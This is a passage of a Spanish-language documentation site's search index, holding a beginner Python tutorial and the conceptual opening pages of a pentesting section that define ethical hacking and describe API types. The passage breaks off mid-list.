<pre><code>nombre = \"Juan\"\nedad = 25\naltura = 1.75\nes_estudiante = True\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#asignacion-multiple","title":"Asignaci\u00f3n m\u00faltiple","text":"<pre><code>a = b = c = 10\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#reglas-para-nombrar-variables","title":"Reglas para nombrar variables","text":"<ul> <li>Usar letras, n\u00fameros y guiones bajos (<code>_</code>)</li> <li>No iniciar con n\u00famero</li> <li>No usar palabras reservadas (<code>if</code>, <code>for</code>, etc.)</li> <li>Diferencia entre may\u00fasculas y min\u00fasculas</li> <li>Usar nombres descriptivos</li> </ul> <pre><code>nombre_completo = \"Ana Torres\"\ntotal_ventas = 1200\n</code></pre> <p>\u274c Ejemplos inv\u00e1lidos: <code>1edad</code>, <code>nombre-completo</code>, <code>if</code></p>"},{"location":"lenguages/python/01_Fundamentos/#22-operadores","title":"2.2 Operadores","text":"<p>Python proporciona varios operadores:</p>"},{"location":"lenguages/python/01_Fundamentos/#aritmeticos","title":"\u2795 Aritm\u00e9ticos","text":"Operador Significado Ejemplo <code>+</code> Suma <code>a + b</code> <code>-</code> Resta <code>a - b</code> <code>*</code> Multiplicaci\u00f3n <code>a * b</code> <code>/</code> Divisi\u00f3n (float) <code>a / b</code> <code>//</code> Divisi\u00f3n entera <code>a // b</code> <code>%</code> M\u00f3dulo (residuo) <code>a % b</code> <code>**</code> Exponenciaci\u00f3n <code>a ** b</code> <pre><code>a = 10\nb = 3\n\nprint(a + b)  # 13\nprint(a / b)  # 3.33...\nprint(a ** b) # 1000\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#comparacion","title":"\ud83d\udd0d Comparaci\u00f3n","text":"Operador Descripci\u00f3n <code>==</code> Igual a <code>!=</code> Distinto de <code>&gt;</code> Mayor que <code>&lt;</code> Menor que <code>&gt;=</code> Mayor o igual <code>&lt;=</code> Menor o igual <pre><code>print(a == b)  # False\nprint(a &gt;= b)  # True\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#logicos","title":"\ud83e\udde0 L\u00f3gicos","text":"Operador Uso <code>and</code> Verdadero si ambas condiciones <code>or</code> Verdadero si alguna condici\u00f3n <code>not</code> Invierte valor l\u00f3gico <pre><code>a = 10\nb = 3\n\nprint((a &gt; 5) and (b &lt; 5))   # True\nprint((a &gt; 15) or (b &lt; 5))   # True\nprint(not (a &gt; 5))           # False\n</code></pre> <p>\u26a0 Importante: Python respeta la precedencia de operadores: 1. Par\u00e9ntesis <code>()</code> 2. Exponenciaci\u00f3n <code>**</code> 3. Multiplicaci\u00f3n/Divisi\u00f3n <code>* / // %</code> 4. Suma/Resta <code>+ -</code> 5. Comparaciones <code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, etc. 6. Operadores l\u00f3gicos <code>and</code>, <code>or</code>, <code>not</code></p> <p>\u2705 \u00a1Con estos fundamentos ya puedes empezar a escribir l\u00f3gica y estructuras b\u00e1sicas en Python!</p>"},{"location":"lenguages/python/02_Estructuras_de_control/","title":"03 - Estructuras de Control \ud83d\udd01","text":""},{"location":"lenguages/python/02_Estructuras_de_control/#3-estructuras-de-control","title":"3. Estructuras de control","text":"<p>Las estructuras de control permiten tomar decisiones y repetir acciones en un programa. Las m\u00e1s comunes en Python son las condicionales y los bucles (loops).</p>"},{"location":"lenguages/python/02_Estructuras_de_control/#31-condicionales","title":"3.1 Condicionales","text":""},{"location":"lenguages/python/02_Estructuras_de_control/#if","title":"\ud83d\udd39 <code>if</code>","text":"<p>Ejecuta un bloque solo si se cumple una condici\u00f3n:</p> <pre><code>edad = 18\n\nif edad &gt;= 18:\n    print(\"Eres mayor de edad.\")\n</code></pre>"},{"location":"lenguages/python/02_Estructuras_de_control/#if-else","title":"\ud83d\udd39 <code>if-else</code>","text":"<p>Ejecuta un bloque si la condici\u00f3n es verdadera, y otro si es falsa:</p> <pre><code>edad = 15\n\nif edad &gt;= 18:\n    print(\"Eres mayor de edad.\")\nelse:\n    print(\"Eres menor de edad.\")\n</code></pre>"},{"location":"lenguages/python/02_Estructuras_de_control/#if-elif-else","title":"\ud83d\udd39 <code>if-elif-else</code>","text":"<p>Permite m\u00faltiples condiciones:</p> <pre><code>calificacion = 85\n\nif calificacion &gt;= 90:\n    print(\"Excelente\")\nelif calificacion &gt;= 80:\n    print(\"Muy bueno\")\nelif calificacion &gt;= 70:\n    print(\"Bueno\")\nelse:\n    print(\"Necesita mejorar\")\n</code></pre>"},{"location":"lenguages/python/02_Estructuras_de_control/#32-bucles-loops","title":"3.2 Bucles (Loops)","text":"<p>Los bucles permiten repetir un bloque de c\u00f3digo.</p>"},{"location":"lenguages/python/02_Estructuras_de_control/#for","title":"\ud83d\udd01 <code>for</code>","text":"<p>Itera sobre una secuencia:</p> <pre><code>frutas = [\"manzana\", \"banana\", \"naranja\"]\n\nfor fruta in frutas:\n    print(fruta)\n</code></pre>"},{"location":"lenguages/python/02_Estructuras_de_control/#while","title":"\ud83d\udd01 <code>while</code>","text":"<p>Repite un bloque mientras la condici\u00f3n sea verdadera:</p> <pre><code>contador = 0\n\nwhile contador &lt; 5:\n    print(contador)\n    contador += 1\n</code></pre> <p>\u26a0 \u00a1Cuidado con los bucles infinitos!</p>"},{"location":"lenguages/python/02_Estructuras_de_control/#33-control-de-bucles","title":"3.3 Control de Bucles","text":""},{"location":"lenguages/python/02_Estructuras_de_control/#break","title":"\ud83d\uded1 <code>break</code>","text":"<p>Termina el bucle inmediatamente:</p> <pre><code>contador = 0\n\nwhile True:\n    print(contador)\n    contador += 1\n    if contador == 5:\n        break\n</code></pre>"},{"location":"lenguages/python/02_Estructuras_de_control/#continue","title":"\ud83d\udd04 <code>continue</code>","text":"<p>Salta al siguiente ciclo del bucle:</p> <pre><code>for i in range(10):\n    if i % 2 == 0:\n        continue\n    print(i)\n</code></pre> <p>Solo se imprimen los impares</p>"},{"location":"lenguages/python/02_Estructuras_de_control/#pass","title":"\u23ed <code>pass</code>","text":"<p>No hace nada. Se usa como marcador de posici\u00f3n:</p> <pre><code>for i in range(5):\n    pass  # c\u00f3digo por implementar\n</code></pre>"},{"location":"lenguages/python/02_Estructuras_de_control/#conclusion","title":"\u2705 Conclusi\u00f3n","text":"<p>Las estructuras de control en Python incluyen:</p> <ul> <li>Condicionales: <code>if</code>, <code>if-else</code>, <code>if-elif-else</code></li> <li>Bucles: <code>for</code>, <code>while</code></li> <li>Control de flujo: <code>break</code>, <code>continue</code>, <code>pass</code></li> </ul> <p>Estas herramientas te permiten controlar c\u00f3mo y cu\u00e1ndo se ejecuta el c\u00f3digo dentro de tus programas.</p>"},{"location":"lenguages/python/03_Estructuras_de_datos/","title":"04 - Estructuras de Datos \ud83e\uddf1","text":"<p>Las estructuras de datos permiten organizar y almacenar informaci\u00f3n eficientemente. En Python existen varias integradas: listas, tuplas, diccionarios y conjuntos.</p>"},{"location":"lenguages/python/03_Estructuras_de_datos/#41-listas","title":"4.1 Listas","text":"<p>Colecciones ordenadas y mutables, se crean con <code>[]</code>.</p> <pre><code>frutas = [\"manzana\", \"banana\", \"naranja\"]\nprint(frutas[0])   # manzana\nprint(frutas[-1])  # naranja\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#metodos-utiles","title":"M\u00e9todos \u00fatiles","text":"<pre><code>frutas.append(\"pera\")\nfrutas.insert(1, \"uva\")\nfrutas.remove(\"banana\")\nfruta = frutas.pop(2)\nfrutas.sort()\nfrutas.reverse()\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#listas-por-comprension","title":"Listas por comprensi\u00f3n","text":"<pre><code>numeros = [1, 2, 3, 4, 5]\ncuadrados = [x ** 2 for x in numeros if x % 2 == 0]\nprint(cuadrados)  # [4, 16]\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#42-tuplas","title":"4.2 Tuplas","text":"<p>Colecciones ordenadas e inmutables, se crean con <code>()</code>.</p> <pre><code>punto = (3, 4)\nprint(punto[0])  # 3\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#metodos-utiles_1","title":"M\u00e9todos \u00fatiles","text":"<pre><code>mi_tupla = (1, 2, 3, 2, 4, 2)\nprint(mi_tupla.index(2))         # 1\nprint(mi_tupla.index(2, 2))      # 3\nprint(mi_tupla.count(2))         # 3\nprint(len(mi_tupla))             # 6\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#43-diccionarios","title":"4.3 Diccionarios","text":"<p>Colecciones no ordenadas de pares clave-valor, se crean con <code>{}</code>.</p> <pre><code>persona = {\"nombre\": \"Juan\", \"edad\": 25, \"ciudad\": \"Madrid\"}\nprint(persona[\"nombre\"])     # Juan\nprint(persona.get(\"pais\"))   # None\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#metodos-utiles_2","title":"M\u00e9todos \u00fatiles","text":"<pre><code>persona.keys()     # dict_keys([...])\npersona.values()   # dict_values([...])\npersona.items()    # dict_items([...])\npersona.update({\"profesion\": \"Ingeniero\"})\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#44-conjuntos-set","title":"4.4 Conjuntos (<code>set</code>)","text":"<p>Colecciones no ordenadas de elementos \u00fanicos.</p> <pre><code>frutas = {\"manzana\", \"banana\", \"naranja\"}\nnumeros = set([1, 2, 3, 4])\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#operaciones-de-conjuntos","title":"Operaciones de conjuntos","text":"<pre><code>a = {1, 2, 3}\nb = {3, 4, 5}\n\nprint(a | b)  # uni\u00f3n: {1, 2, 3, 4, 5}\nprint(a &amp; b)  # intersecci\u00f3n: {3}\nprint(a - b)  # diferencia: {1, 2}\nprint(a ^ b)  # diferencia sim\u00e9trica: {1, 2, 4, 5}\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#metodos-utiles_3","title":"M\u00e9todos \u00fatiles","text":"<pre><code>frutas.add(\"pera\")\nfrutas.remove(\"banana\")\nfrutas.discard(\"uva\")\nfrutas.clear()\n</code></pre>"},{"location":"lenguages/python/03_Estructuras_de_datos/#conclusion","title":"\u2705 Conclusi\u00f3n","text":"Estructura Ordenado Mutable Clave-Valor Duplicados Lista S\u00ed S\u00ed No S\u00ed Tupla S\u00ed No No S\u00ed Diccionario No S\u00ed S\u00ed No (en claves) Conjunto No S\u00ed No No <p>Cada estructura tiene ventajas seg\u00fan el uso. Python ofrece gran flexibilidad para almacenar y trabajar con datos eficientemente.</p>"},{"location":"lenguages/python/04_Funciones/","title":"05 - Funciones en Python \ud83e\udde9","text":"<p>Las funciones son bloques de c\u00f3digo reutilizables que encapsulan tareas espec\u00edficas. Son esenciales para organizar, modularizar y reutilizar el c\u00f3digo.</p>"},{"location":"lenguages/python/04_Funciones/#definicion-y-llamada-de-funciones","title":"\ud83d\udccc Definici\u00f3n y llamada de funciones","text":"<pre><code>def saludo():\n    print(\"\u00a1Hola, mundo!\")\n\nsaludo()  # Imprime \"\u00a1Hola, mundo!\"\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#parametros-y-argumentos","title":"\ud83c\udfaf Par\u00e1metros y argumentos","text":"<pre><code>def saludo(nombre):\n    print(f\"\u00a1Hola, {nombre}!\")\n\nsaludo(\"Juan\")   # \u00a1Hola, Juan!\nsaludo(\"Mar\u00eda\")  # \u00a1Hola, Mar\u00eda!\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#valores-de-retorno","title":"\ud83d\udd01 Valores de retorno","text":"<pre><code>def suma(a, b):\n    return a + b\n\nresultado = suma(3, 4)\nprint(resultado)  # 7\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#funciones-lambda-anonimas","title":"\u26a1 Funciones lambda (an\u00f3nimas)","text":"<p>Funciones peque\u00f1as y concisas:</p> <pre><code>cuadrado = lambda x: x ** 2\nprint(cuadrado(5))  # 25\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#alcance-de-variables","title":"\ud83c\udf10 Alcance de variables","text":"<pre><code>def funcion():\n    variable_local = 10\n    print(variable_local)\n\nvariable_global = 20\n\ndef funcion2():\n    print(variable_global)\n\nfuncion()       # 10\nfuncion2()      # 20\nprint(variable_global)  # 20\n# print(variable_local)  # \u274c Error: fuera de alcance\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#docstrings","title":"\ud83d\udcdd Docstrings","text":"<p>Documentaci\u00f3n dentro de funciones:</p> <pre><code>def area_rectangulo(base, altura):\n    \"\"\"\n    Calcula el \u00e1rea de un rect\u00e1ngulo.\n\n    Args:\n        base (float): Base del rect\u00e1ngulo.\n        altura (float): Altura del rect\u00e1ngulo.\n\n    Returns:\n        float: \u00c1rea del rect\u00e1ngulo.\n    \"\"\"\n    return base * altura\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#numero-variable-de-argumentos","title":"\ud83d\udd22 N\u00famero variable de argumentos","text":"<pre><code>def suma_variable(*numeros):\n    total = 0\n    for numero in numeros:\n        total += numero\n    return total\n\nprint(suma_variable(1, 2, 3))       # 6\nprint(suma_variable(4, 5, 6, 7))    # 22\n</code></pre>"},{"location":"lenguages/python/04_Funciones/#conclusion","title":"\u2705 Conclusi\u00f3n","text":"<p>Las funciones permiten:</p> <ul> <li>Reutilizar c\u00f3digo</li> <li>Modularizar programas</li> <li>Documentar tareas espec\u00edficas</li> <li>Aceptar m\u00faltiples par\u00e1metros</li> <li>Trabajar con variables locales y globales</li> </ul> <p>Adem\u00e1s de funciones propias, puedes usar funciones incorporadas como <code>print()</code>, <code>len()</code>, <code>type()</code>, <code>range()</code>, entre muchas otras.</p>"},{"location":"lenguages/python/05_Manejo_de_errores/","title":"06 - Manejo de Errores y Excepciones \u26a0\ufe0f","text":"<p>Cuando programamos, pueden surgir errores inesperados. Python proporciona mecanismos para manejarlos usando excepciones y as\u00ed evitar que el programa se detenga abruptamente.</p>"},{"location":"lenguages/python/05_Manejo_de_errores/#61-errores-comunes-en-python","title":"6.1 Errores comunes en Python \ud83e\udde8","text":"Tipo de Error Descripci\u00f3n Ejemplo <code>SyntaxError</code> Ocurre cuando se violan reglas de sintaxis. <code>def mi_funcion() print(\"Hola\")</code> <code>NameError</code> Se hace referencia a una variable no definida. <code>print(variable_no_definida)</code> <code>TypeError</code> Operaci\u00f3n con tipos incompatibles. <code>resultado = 5 + \"10\"</code> <code>IndexError</code> Acceso a un \u00edndice fuera de rango. <code>lista = [1,2,3]; print(lista[3])</code>"},{"location":"lenguages/python/05_Manejo_de_errores/#62-manejo-de-excepciones-con-try-except-finally","title":"6.2 Manejo de excepciones con <code>try</code> / <code>except</code> / <code>finally</code>","text":""},{"location":"lenguages/python/05_Manejo_de_errores/#try","title":"\ud83d\udd39 try","text":"<p>Se usa para envolver c\u00f3digo que puede fallar:</p> <pre><code>try:\n    resultado = 10 / 0\n    print(resultado)\nexcept ZeroDivisionError:\n    print(\"Error: Divisi\u00f3n por cero\")\n</code></pre>"},{"location":"lenguages/python/05_Manejo_de_errores/#multiples-except","title":"\ud83d\udd39 M\u00faltiples except","text":"<pre><code>try:\n    resultado = int(\"Hola\")\nexcept ZeroDivisionError:\n    print(\"Error: Divisi\u00f3n por cero\")\nexcept ValueError:\n    print(\"Error: Valor inv\u00e1lido\")\n</code></pre>"},{"location":"lenguages/python/05_Manejo_de_errores/#finally","title":"\ud83d\udd39 finally","text":"<p>Se ejecuta siempre, ocurra o no una excepci\u00f3n:</p> <pre><code>try:\n    archivo = open(\"archivo.txt\", \"r\")\nexcept FileNotFoundError:\n    print(\"Error: Archivo no encontrado\")\nfinally:\n    archivo.close()\n</code></pre>"},{"location":"lenguages/python/05_Manejo_de_errores/#63-excepciones-personalizadas","title":"6.3 Excepciones personalizadas \ud83d\udea8","text":"<p>Puedes lanzar errores personalizados usando <code>raise</code>:</p> <pre><code>def funcion():\n    condicion = True\n    if condicion:\n        raise Exception(\"Descripci\u00f3n del error\")\n\ntry:\n    funcion()\nexcept Exception as e:\n    print(f\"Error: {str(e)}\")\n</code></pre>"},{"location":"lenguages/python/05_Manejo_de_errores/#conclusion","title":"\u2705 Conclusi\u00f3n","text":"<ul> <li>Usa <code>try</code> para detectar errores potenciales</li> <li>Usa <code>except</code> para capturar y manejar errores espec\u00edficos</li> <li>Usa <code>finally</code> para liberar recursos</li> <li>Puedes lanzar tus propias excepciones con <code>raise</code></li> </ul> <p>\u26a0\ufe0f Consejo: Considera siempre qu\u00e9 errores pueden ocurrir y maneja las excepciones correctamente. Esto hace tu c\u00f3digo m\u00e1s robusto, confiable y profesional.</p>"},{"location":"lenguages/python/06_Entrada_y_Salida/","title":"07 - Entrada y Salida de Datos \ud83d\udda5\ufe0f\ud83d\udcc2","text":"<p>Python permite interactuar con el usuario y manipular archivos para lectura y escritura. Esto se conoce como entrada/salida (I/O).</p>"},{"location":"lenguages/python/06_Entrada_y_Salida/#entrada-de-datos-del-usuario","title":"\ud83e\uddd1\u200d\ud83d\udcbb Entrada de datos del usuario","text":"<p>Usamos <code>input()</code> para capturar valores del usuario:</p> <pre><code>nombre = input(\"Ingresa tu nombre: \")\nedad = input(\"Ingresa tu edad: \")\n\nprint(\"Hola, \" + nombre + \"!\")\nprint(\"Tienes \" + edad + \" a\u00f1os.\")\n</code></pre> <p>\u26a0\ufe0f <code>input()</code> siempre devuelve texto (tipo <code>str</code>). Usa <code>int()</code> o <code>float()</code> si necesitas convertir:</p> <pre><code>edad = int(input(\"Ingresa tu edad: \"))\n\nif edad &gt;= 18:\n    print(\"Eres mayor de edad.\")\nelse:\n    print(\"Eres menor de edad.\")\n</code></pre>"},{"location":"lenguages/python/06_Entrada_y_Salida/#salida-de-datos","title":"\ud83d\udce4 Salida de datos","text":"<p>La funci\u00f3n <code>print()</code> se usa para mostrar resultados en pantalla.</p>"},{"location":"lenguages/python/06_Entrada_y_Salida/#formateo-con-f-strings","title":"Formateo con f-strings:","text":"<pre><code>nombre = \"Juan\"\nedad = 25\n\nprint(f\"Hola, mi nombre es {nombre} y tengo {edad} a\u00f1os.\")\n</code></pre>"},{"location":"lenguages/python/06_Entrada_y_Salida/#71-lectura-y-escritura-de-archivos","title":"7.1 \ud83d\udcc1 Lectura y escritura de archivos","text":""},{"location":"lenguages/python/06_Entrada_y_Salida/#lectura-de-archivos","title":"\ud83d\udcd6 Lectura de archivos","text":"<pre><code>archivo = open(\"datos.txt\", \"r\")\ncontenido = archivo.read()\nprint(contenido)\narchivo.close()\n</code></pre> <p>O tambi\u00e9n con <code>with</code>, que cierra autom\u00e1ticamente:</p> <pre><code>with open(\"datos.txt\", \"r\") as archivo:\n    contenido = archivo.read()\n    print(contenido)\n</code></pre>"},{"location":"lenguages/python/06_Entrada_y_Salida/#escritura-de-archivos","title":"\u270d\ufe0f Escritura de archivos","text":"<pre><code>archivo = open(\"datos.txt\", \"w\")\narchivo.write(\"Hola, mundo!\")\narchivo.close()\n</code></pre> <ul> <li><code>\"w\"</code> = escritura (sobrescribe)</li> <li><code>\"a\"</code> = anexar (agrega al final)</li> </ul> <p>\u2705 Usa <code>with</code> para manejar archivos de forma segura:</p> <pre><code>with open(\"datos.txt\", \"w\") as archivo:\n    archivo.write(\"L\u00ednea 1\\nL\u00ednea 2\")\n</code></pre>"},{"location":"lenguages/python/06_Entrada_y_Salida/#conclusion","title":"\u2705 Conclusi\u00f3n","text":"<ul> <li><code>input()</code> obtiene datos del usuario</li> <li><code>print()</code> muestra datos en consola</li> <li>Usa <code>int()</code> o <code>float()</code> para convertir entradas num\u00e9ricas</li> <li><code>open()</code> permite manipular archivos</li> <li><code>with open(...)</code> es la forma recomendada</li> </ul> <p>La entrada/salida es fundamental para interactuar con usuarios y almacenar datos de forma persistente.</p>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/","title":"08 - Importaci\u00f3n y Creaci\u00f3n de M\u00f3dulos \ud83e\uddf1\ud83d\udce6","text":"<p>En Python, los m\u00f3dulos y paquetes permiten organizar y reutilizar c\u00f3digo. Un m\u00f3dulo es un archivo <code>.py</code> que contiene funciones, clases o variables. Un paquete es un conjunto de m\u00f3dulos organizados en carpetas.</p>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#81-importar-modulos","title":"8.1 \ud83d\udce5 Importar m\u00f3dulos","text":""},{"location":"lenguages/python/07_Modulos_y_Paquetes/#importacion-completa","title":"\ud83d\udd39 Importaci\u00f3n completa","text":"<pre><code>import math\n\nresultado = math.sqrt(25)\nprint(resultado)  # 5.0\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#importacion-parcial","title":"\ud83d\udd39 Importaci\u00f3n parcial","text":"<pre><code>from math import sqrt\n\nresultado = sqrt(25)\nprint(resultado)  # 5.0\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#modulos-estandar-utiles","title":"\ud83e\uddf0 M\u00f3dulos est\u00e1ndar \u00fatiles","text":"M\u00f3dulo Funcionalidad <code>math</code> Funciones matem\u00e1ticas <code>random</code> Generaci\u00f3n de n\u00fameros aleatorios <code>datetime</code> Manejo de fechas y tiempos <pre><code>import random\nimport datetime\n\nprint(random.randint(1, 10))           # N\u00famero entre 1 y 10\nprint(datetime.datetime.now())        # Fecha y hora actual\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#82-crear-tus-propios-modulos","title":"8.2 \ud83d\udd28 Crear tus propios m\u00f3dulos","text":""},{"location":"lenguages/python/07_Modulos_y_Paquetes/#archivo-mi_modulopy","title":"Archivo: <code>mi_modulo.py</code>","text":"<pre><code>def saludar(nombre):\n    print(f\"Hola, {nombre}!\")\n\ndef calcular_suma(a, b):\n    return a + b\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#usar-el-modulo-en-otro-archivo","title":"Usar el m\u00f3dulo en otro archivo","text":"<pre><code>import mi_modulo\n\nmi_modulo.saludar(\"Juan\")\nprint(mi_modulo.calcular_suma(5, 3))  # 8\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#organizacion-del-codigo","title":"\ud83d\uddc2\ufe0f Organizaci\u00f3n del c\u00f3digo","text":"<p>Puedes dividir tu programa en m\u00f3dulos seg\u00fan su funcionalidad:</p>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#operacionespy","title":"<code>operaciones.py</code>","text":"<pre><code>def sumar(a, b):\n    return a + b\n\ndef restar(a, b):\n    return a - b\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#utilidadespy","title":"<code>utilidades.py</code>","text":"<pre><code>def imprimir_mensaje(mensaje):\n    print(mensaje)\n\ndef obtener_nombre_usuario():\n    return input(\"Ingresa tu nombre: \")\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#archivo-principal","title":"Archivo principal","text":"<pre><code>import operaciones\nimport utilidades\n\nresultado = operaciones.sumar(5, 3)\nutilidades.imprimir_mensaje(f\"Resultado: {resultado}\")\n\nnombre = utilidades.obtener_nombre_usuario()\nutilidades.imprimir_mensaje(f\"Hola, {nombre}!\")\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#83-paquetes-en-python","title":"8.3 \ud83d\udce6 Paquetes en Python","text":"<p>Un paquete es una carpeta que contiene un archivo <code>__init__.py</code> y uno o m\u00e1s m\u00f3dulos.</p>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#estructura-de-ejemplo","title":"Estructura de ejemplo","text":"<pre><code>mi_paquete/\n\u251c\u2500\u2500 __init__.py\n\u251c\u2500\u2500 modulo1.py\n\u2514\u2500\u2500 modulo2.py\n</code></pre>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#uso","title":"Uso","text":"<pre><code>from mi_paquete import modulo1, modulo2\n\nmodulo1.funcion1()\nmodulo2.funcion2()\n</code></pre> <p>El archivo <code>__init__.py</code> puede estar vac\u00edo o contener c\u00f3digo de inicializaci\u00f3n del paquete.</p>"},{"location":"lenguages/python/07_Modulos_y_Paquetes/#conclusion","title":"\u2705 Conclusi\u00f3n","text":"<ul> <li>Usa <code>import</code> o <code>from ... import</code> para acceder a m\u00f3dulos</li> <li>Reutiliza m\u00f3dulos est\u00e1ndar (<code>math</code>, <code>random</code>, <code>datetime</code>, etc.)</li> <li>Crea tus propios m\u00f3dulos para mantener un c\u00f3digo organizado</li> <li>Usa paquetes para agrupar m\u00f3dulos relacionados</li> </ul> <p>Explora la documentaci\u00f3n oficial para conocer m\u00e1s sobre la biblioteca est\u00e1ndar de Python.</p>"},{"location":"pentest/introduccion/","title":"INTRODUCCION","text":""},{"location":"pentest/introduccion/#pentest","title":"PENTEST","text":"<p>Las pruebas de penetraci\u00f3n son la metodolog\u00eda, el proceso y los procedimientos utilizados por los Testers dentro de unas directrices espec\u00edficas y aprobadas para intentar burlar las protecciones de un sistema de informaci\u00f3n.</p> <p>Este tipo de pruebas este asociado a la evaluaci\u00f3n de los controles t\u00e9cnicos, administrativos y operativos de un sistema.</p> <p>Un hacker \u00e9tico es un tester de penetraci\u00f3n profesional que ataca sistemas en nombre del propietario del sistema o de la organizaci\u00f3n propietaria del sistema.</p> <p>Intentar comprometer un sistema para el que no se tiene permiso explicito es completamente ilegal.</p>"},{"location":"pentest/pentest-apis/","title":"Pentest en APIs","text":""},{"location":"pentest/pentest-apis/#que-es-y-para-que-sirve-una-api","title":"\u00bfQu\u00e9 es y para qu\u00e9 sirve una API?","text":"<p>Una API(Interfaz de Programaci\u00f3n de Aplicaciones) es un conjunto de reglas que permiten que diferentes softwares se comuniquen entre s\u00ed. Las APIs definen como las solicitudes deben ser hechas, que datos se pueden pedir y como se deben enviar las respuestas.</p> <p>Las APIs permiten que los productos y servicios se comuniquen con otros sin necesidad de saber c\u00f3mo est\u00e1n implementados. Esto simplifica el desarrollo de aplicaciones, ahorrando tiempo y dinero. Las APIs otorgan flexibilidad; simplifican el dise\u00f1o, la administraci\u00f3n y el uso de aplicaciones; y proporcionan oportunidades de innovaci\u00f3n. </p> <p>CARACTERISTICAS CLAVE DE LAS APIS:</p> <ul> <li>Abstracci\u00f3n: Ocultan la complejidad de los sistemas subyacentes</li> <li>Estandarizaci\u00f3n: Proporcionan una interfaz consistente para interactuar con diferentes sistemas</li> <li>Eficiencia: Permite el acceso a funcionalidades especificas sin necesidad de comprender todo el sistema.</li> </ul> <p>\u00bfCOMO FUNCIONA UNA API?</p> <p>Se puede resumir el funcionamiento b\u00e1sico en los siguientes pasos:</p> <ol> <li>Solicitud del cliente: Una aplicaci\u00f3n cliente realiza una solicitud a la API, generalmente a trav\u00e9s de HTTP</li> <li>Procesamiento de la solicitud: El servidor que aloja la API recibe la solicitud y la procesa.</li> <li>Acceso a recursos: La API accede a los recursos necesarios (bases de datos, servicios externos, etc.) para cumplir con la solicitud</li> <li>Preparaci\u00f3n de la respuesta: La API prepara los datos en el formato adecuado (generalmente JSON o XML)</li> <li>Env\u00edo de la respuesta: El servidor env\u00eda la respuesta al cliente.</li> <li>Procesamiento del cliente: LA aplicaci\u00f3n cliente recibe y procesa la respuesta.</li> </ol> <p>EJEMPLO</p> <p>Supongamos una API de pronostico del tiempo. Un cliente podr\u00eda hacer una solicitud GET a \u201cX\u201d.</p> <p>El servidor procesar\u00eda la solicitud, consultar\u00eda sus bases de datos meteorol\u00f3gicas, preparar\u00eda un pron\u00f3stico para CDMX y devolver\u00eda una respuesta JSON como: https://api.weather.com/forecast?city=CDMX </p>"},{"location":"pentest/pentest-apis/#tipos-de-apis","title":"TIPOS DE APIs","text":"<p>Existen tipos de APIs y las vamos a separar en arquitectura y diferencias de acceso, para que podamos entender a fondo.</p>"},{"location":"pentest/pentest-apis/#arquitecura","title":"ARQUITECURA","text":""},{"location":"pentest/pentest-apis/#rest-representational-state-transfer","title":"REST (Representational State Transfer)","text":"<ul> <li>Utiliza m\u00e9todos HTTP est\u00e1ndar (GET, POST, PUT, DELETE, etc.)</li> <li>Stateless: Cada solicitud contiene toda la informaci\u00f3n necesaria</li> <li>Recursos identificados por URLs</li> <li>Formato de datos com\u00fan: JSON, a veces XML</li> <li>Ejemplo: Para obtener informaci\u00f3n del usuario con ID 123 (GET /api/users/123)</li> </ul>"},{"location":"pentest/pentest-apis/#soap-simple-object-access-protocol","title":"SOAP (Simple Object Access Protocol)","text":"<ul> <li>Protocolo basado en XML</li> <li>Independiente del protocolo de transporte (puede usar HTTP, SMTP, etc.)</li> <li>Tiene un conjunto de reglas estricto</li> <li>Mejor para operaciones complejas y entornos empresariales</li> <li>Ejemplo de mensaje SOAP: </li> </ul>"},{"location":"pentest/pentest-apis/#grapql","title":"GrapQL","text":"<ul> <li>Lenguaje de consulta para APIs</li> <li>Permite a los clientes solicitar exactamente los datos que necesitan</li> <li>Un solo endpoint para todas las operaciones</li> <li>Fuertemente tipado</li> <li>Ejemplo de consulta GraphQL: </li> </ul>"},{"location":"pentest/pentest-apis/#rpc-remote-procedure-call","title":"RPC (Remote Procedure Call)","text":"<ul> <li>Permite la ejecuci\u00f3n de procedimientos en sistemas remotos</li> <li>Puede ser basado en XML (XML-RPC) o JSON (JSON-RPC)</li> <li>Mas simples que SOAP, pero menos flexible que REST</li> <li>Ejemplo de llamada JSON-RPC: </li> </ul>"},{"location":"pentest/pentest-apis/#acceso","title":"ACCESO","text":""},{"location":"pentest/pentest-apis/#apis-publicas","title":"APIs publicas","text":"<ul> <li>Accesibles para cualquier desarrollador</li> <li>Pueden requerir una clave de API para el control de acceso</li> <li>Ejemplo: API de Twitter, Google Maps API</li> </ul>"},{"location":"pentest/pentest-apis/#apis-privadas","title":"APIs privadas","text":"<ul> <li>Uso interno dentro de una organizaci\u00f3n</li> <li>No accesibles fuera de la red de la empresa</li> <li>Ejemplo: API interna para comunicaci\u00f3n entre microservicios</li> 